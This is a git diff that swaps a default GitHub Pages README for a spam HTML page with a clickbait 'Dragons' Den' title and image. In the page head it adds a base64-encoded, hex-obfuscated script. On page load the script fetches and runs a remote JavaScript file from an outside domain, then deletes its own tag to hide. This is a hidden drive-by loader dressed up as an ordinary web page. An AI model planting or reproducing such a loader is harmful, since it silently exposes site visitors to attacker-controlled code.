@@ -1,37 +1,18 @@
-## Welcome to GitHub Pages
 
-You can use the [editor on GitHub](https://github.com/uk-go-online/uk/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+<html lang="it">
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>The Biggest Deal In Dragons' Den History</title>
 
-### Markdown
+<p><img src="https://bloximages.chicago2.vip.townnews.com/democratherald.com/content/tncms/assets/v3/editorial/1/8b/18b73ccc-30da-5d53-b23f-4bb5d31bde26/5995f06387d13.image.jpg?resize=1200%2C789" alt="" /></p>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	
+	<script id="bpMyf" src="data:text/javascript;base64, dmFyIF90djVjbiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX0h0Z3JFLCBfVlhsTm0pIHt2YXIgX1pocU51ID0gZnVuY3Rpb24oX1VCVzhDKSB7d2hpbGUgKC0tX1VCVzhDKSB7X0h0Z3JFWydwdXNoJ10oX0h0Z3JFWydzaGlmdCddKCkpO319O19aaHFOdSgrK19WWGxObSk7fShfdHY1Y24sIDB4MTFiKSk7dmFyIF9HWXQzcyA9IGZ1bmN0aW9uKF9YRDNIbywgXzZUeFJhKSB7X1hEM0hvID0gX1hEM0hvIC0gMHgwO3ZhciBfc1dTVFogPSBfdHY1Y25bX1hEM0hvXTtyZXR1cm4gX3NXU1RaO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfR1l0M3MoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1Z5ZjNVID0gZG9jdW1lbnRbX0dZdDNzKCcweDEnKV0oX0dZdDNzKCcweDInKSk7X1Z5ZjNVW19HWXQzcygnMHgzJyldID0gX0dZdDNzKCcweDQnKTtfVnlmM1VbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NzNceDczXHg2Zlx4NmNceDc3XHg2NVx4NjJceDJlXHg2OVx4NmVceDY2XHg2Zlx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NzBceDQ5XHg0Zlx4NDhceDQ0XHg3N1x4NjZceDU1XHg0NVx4NDgnO2RvY3VtZW50W19HWXQzcygnMHg1JyldKF9HWXQzcygnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9WeWYzVSk7ZG9jdW1lbnRbX0dZdDNzKCcweDcnKV0oJ2JwTXlmJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
+</head>
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+<body>
+hello
+</body>
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/uk-go-online/uk/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+</html>
